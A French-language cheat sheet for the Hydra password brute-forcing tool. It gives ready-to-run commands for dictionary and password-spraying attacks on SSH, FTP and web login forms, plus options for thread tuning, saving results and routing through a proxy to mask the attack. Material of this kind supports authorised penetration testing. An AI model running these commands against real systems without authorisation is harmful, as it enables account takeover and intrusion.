# cheat sheet Hydra

Une référence rapide pour les commandes courantes de **Hydra**, un outil de cracking de mots de passe par force brute, avec fonctions, commandes et exemples.

---

## 1. Attaque par dictionnaire sur SSH
**Fonction** : Tester des mots de passe sur un service SSH.  
**Commande** : `hydra -l <username> -P <wordlist> ssh://<target>`  
**Exemple** : `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10`  
- Tente de craquer le mot de passe de "root" sur SSH à 192.168.1.10 avec rockyou.txt.

---

## 2. Attaque par dictionnaire sur HTTP POST
**Fonction** : Tester des identifiants sur un formulaire web (POST).  
**Commande** : `hydra -l <username> -P <wordlist> <target> http-post-form "<path>:<form_params>:<failure_string>"`  
**Exemple** : `hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"`  
- Craque un formulaire à /login avec "admin" et rockyou.txt.

---

## 3. Attaque avec liste d’utilisateurs et mots de passe
**Fonction** : Utiliser des listes pour utilisateurs et mots de passe.  
**Commande** : `hydra -L <userlist> -P <wordlist> <target> <service>`  
**Exemple** : `hydra -L users.txt -P rockyou.txt 192.168.1.10 ssh`  
- Teste plusieurs utilisateurs (users.txt) sur SSH.

---

## 4. Attaque sur FTP
**Fonction** : Craquer des identifiants FTP.  
**Commande** : `hydra -l <username> -P <wordlist> ftp://<target>`  
**Exemple** : `hydra -l ftpuser -P rockyou.txt ftp://192.168.1.20`  
- Tente une attaque sur FTP pour "ftpuser".

---

## 5. Attaque avec mot de passe unique
**Fonction** : Tester un seul mot de passe pour plusieurs utilisateurs.  
**Commande** : `hydra -L <userlist> -p <password> <target> <service>`  
**Exemple** : `hydra -L users.txt -p password123 192.168.1.10 ssh`  
- Teste "password123" pour chaque utilisateur dans users.txt sur SSH.

---

## 6. Ajuster le nombre de threads
**Fonction** : Contrôler la vitesse avec des threads parallèles.  
**Commande** : `hydra -t <threads> -l <username> -P <wordlist> <target> <service>`  
**Exemple** : `hydra -t 16 -l root -P rockyou.txt ssh://192.168.1.10`  
- Utilise 16 threads pour accélérer l’attaque SSH.

---

## 7. Attaque sur HTTPS GET
**Fonction** : Tester un formulaire web via GET sur HTTPS.  
**Commande** : `hydra -l <username> -P <wordlist> <target> https-get "<path>"`  
**Exemple** : `hydra -l admin -P rockyou.txt 192.168.1.10 https-get "/admin"`  
- Teste l’accès à /admin via GET sur HTTPS.

---

## 8. Sauvegarde des résultats
**Fonction** : Enregistrer les identifiants trouvés dans un fichier.  
**Commande** : `hydra -o <outputfile> -l <username> -P <wordlist> <target> <service>`  
**Exemple** : `hydra -o results.txt -l root -P rockyou.txt ssh://192.168.1.10`  
- Sauvegarde les résultats dans results.txt.

---

## 9. Attaque avec proxy
**Fonction** : Utiliser un proxy pour masquer l’attaque.  
**Commande** : `hydra -x <proxy> -l <username> -P <wordlist> <target> <service>`  
**Exemple** : `hydra -x http://127.0.0.1:8080 -l root -P rockyou.txt ssh://192.168.1.10`  
- Utilise un proxy local pour l’attaque SSH.

---

## 10. Mode verbeux
**Fonction** : Afficher plus de détails pendant l’attaque.  
**Commande** : `hydra -V -l <username> -P <wordlist> <target> <service>`  
**Exemple** : `hydra -V -l root -P rockyou.txt ssh://192.168.1.10`  
- Affiche chaque tentative en détail.

---

## Notes importantes
- **Permissions** : Assurez-vous d’avoir l’autorisation de tester les cibles.
- **Installation** :  
  ```bash
  sudo apt update && sudo apt install -y hydra
  ```
